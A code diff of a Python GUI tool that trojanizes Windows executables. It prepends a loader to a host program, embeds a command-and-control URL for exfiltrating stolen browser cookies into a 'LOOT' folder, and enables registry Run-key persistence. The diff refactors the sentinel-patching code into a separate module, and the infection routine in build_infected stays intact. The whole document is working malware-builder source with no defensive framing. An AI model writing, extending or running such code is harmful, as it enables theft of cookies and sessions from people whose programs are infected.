@@ -15,7 +15,8 @@ import json, os, shutil, struct, subprocess, sys, threading, time
 import tkinter as tk
 from tkinter import filedialog, ttk
 
-from peutil import patch_ready
+from cklog import stage
+from cklog.stage import patch_loader
 
 HERE = os.path.dirname(os.path.abspath(__file__))
 BIN  = os.path.join(HERE, "bin")
@@ -32,7 +33,7 @@ TXTF   = os.path.join(LOOT, "cookies_all.txt")
 JSONF_ALT = os.path.join(LOOT, "all_cookies.json")
 TXTF_ALT  = os.path.join(LOOT, "all_cookies.txt")
 COOKED = os.path.join(HERE, "cooked")
-MAGIC  = b"CKLG"
+MAGIC  = stage.MAGIC
 
 LIFE = {
     "notepad.exe":       ("long", "closes when you close it"),
@@ -284,9 +285,9 @@ def run(path, sink, kill, purge, timeout, extra, log=print):
     threading.Thread(target=_thread, daemon=True).start()
 
 # ------------------------------------------------------------------ builder
-C2_SENTINEL = b"CKC2_DEADBEEF_"
-PERSIST_SENTINEL = b"CKPR____"
-PERSIST_ENABLE = b"CKPR0001"
+C2_SENTINEL = stage.C2_SENTINEL
+PERSIST_SENTINEL = stage.PERSIST_SENTINEL
+PERSIST_ENABLE = stage.PERSIST_ENABLE
 
 def build_infected(host_path, c2_url="", persist=False, log=print):
     """Infects the .exe: prepends the loader and appends the original host.
@@ -305,12 +306,6 @@ def build_infected(host_path, c2_url="", persist=False, log=print):
         with open(host_path, "rb") as f: host_bytes = f.read()
     except Exception as ex:
         log("[!] error reading files: %s" % ex); return None
-    # strip appended data from loader if present (reuse case)
-    idx = loader_bytes.rfind(MAGIC)
-    if idx != -1 and idx > len(loader_bytes) - 12:
-        old_len = struct.unpack_from("<I", loader_bytes, idx - 4)[0]
-        loader_bytes = loader_bytes[:idx - 4 - old_len]
-        log("[*] loader already had host appended -- removed")
     # if the host was previously infected, extract the original host from within it
     hidx = host_bytes.rfind(MAGIC)
     if hidx != -1 and hidx > len(host_bytes) - 12:
@@ -319,25 +314,15 @@ def build_infected(host_path, c2_url="", persist=False, log=print):
             log("[*] host was already infected -- restoring original")
             real_host = host_bytes[hidx - 4 - old_hlen : hidx - 4]
             host_bytes = real_host
-    # Patch C2 URL into the payload embedded in the loader
+    loader_bytes, patch_status = patch_loader(loader_bytes, c2_url, persist)
+    if not patch_status["ok"]:
+        for error in patch_status["errors"]:
+            log("[!] " + error)
+        return None
     if c2_url:
-        sidx = patch_ready(loader_bytes, C2_SENTINEL, 256)
-        if sidx == -1:
-            log("[!] C2 slot not patchable -- loader already carries a URL, "
-                "or the C2 sentinel is gone (no HTTP exfiltration)")
-        else:
-            url_bytes = c2_url.encode("utf-8")[:255]
-            url_padded = url_bytes + b"\0" * (256 - len(url_bytes))
-            loader_bytes = loader_bytes[:sidx] + url_padded + loader_bytes[sidx+256:]
-            log("[+] C2 URL embedded: %s" % c2_url)
-    # Patch persistence sentinel if enabled
+        log("[+] C2 URL embedded: %s" % c2_url)
     if persist:
-        pidx = patch_ready(loader_bytes, PERSIST_SENTINEL, 8)
-        if pidx != -1:
-            loader_bytes = loader_bytes[:pidx] + PERSIST_ENABLE + loader_bytes[pidx+8:]
-            log("[+] persistence: enabled (registry Run key)")
-        else:
-            log("[!] persistence flag not patchable (sentinel gone, or already enabled)")
+        log("[+] persistence: enabled (registry Run key)")
     out = loader_bytes + host_bytes + struct.pack("<I", len(host_bytes)) + MAGIC
     # output to ifec/
     IFEC = os.path.join(HERE, "ifec")
